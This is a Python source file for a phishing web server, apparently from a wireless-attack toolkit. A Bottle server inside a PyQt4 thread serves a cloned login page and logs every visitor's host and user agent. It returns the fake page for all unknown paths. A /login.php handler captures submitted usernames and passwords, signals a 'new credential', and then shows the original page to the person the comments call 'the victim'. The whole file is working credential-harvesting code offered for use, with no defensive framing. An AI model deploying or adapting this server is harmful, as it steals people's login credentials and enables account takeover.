import os

from bottle import (Bottle,request,redirect,static_file,run)                 # Bottle Framework - a multiple http server framework like django but smaller

from PyQt4 import QtCore

server = Bottle()

class GhostHTTPServer(QtCore.QThread):
    '''HTTP Server thread'''
    def __init__(self,host,port,html_folder,cwd,username_variable,password_variable):
        QtCore.QThread.__init__(self)
        self.cwd = cwd
        self.host= host
        self.port = port
        self.username_variable = username_variable
        self.password_variable = password_variable
        self.html_folder = html_folder

        self.path = (self.cwd + '/HTTP-Webscript/' + 'index.html')
        self.remote_connection = None
        self.credentials = None

    def original_source(self):
        html_file = open('/tmp/original.html')
        html_source = str(html_file.read())
        html_file.close()
        return html_source

    def fake_source_code(self):
        html_file = open(self.path)
        html_source = str(html_file.read())
        html_file.close()
        return html_source


    def run(self):
        @server.route('/')
        def index():
            string = str(request['REMOTE_HOST'] + '  ---  ' + request['HTTP_USER_AGENT'])
            self.remote_connection = string           # Log client connection
            self.emit(QtCore.SIGNAL("new remote host"))
            return(self.fake_source_code())                                                  # HTTP source code with modified action variable


        @server.error(404)                                                                  # Once in, cant escape ghost ;-)
        def error404(error):
            string = str(request['REMOTE_HOST'] + '  ---  ' + request['HTTP_USER_AGENT'])
            self.remote_connection = string           # Log client connection
            self.emit(QtCore.SIGNAL("new remote host"))
            return(self.fake_source_code())


        @server.route('/' + self.html_folder + '/:filename#.*#')       # e.g   @server.route('/foobar_files/:filename#.*#')
        def path_file(filename):
            return static_file(filename,root= self.cwd + '/HTTP-Webscript/'+ self.html_folder)



        @server.post('/login.php')                                     # redirect the victim to the original web server
        def login():
            username = request.forms.get(self.username_variable)
            password = request.forms.get(self.password_variable)
            if username and password:
                self.credentials = (username,password)                      # Log credentials
                self.emit(QtCore.SIGNAL("new credential"))
                return(self.original_source())                        # HTTP source code with original action variable
            return(self.fake_source_code())

        run(server,host= str(self.host),port=int(self.port),quiet=True)           # run(host='127.0.0.1',port=80)





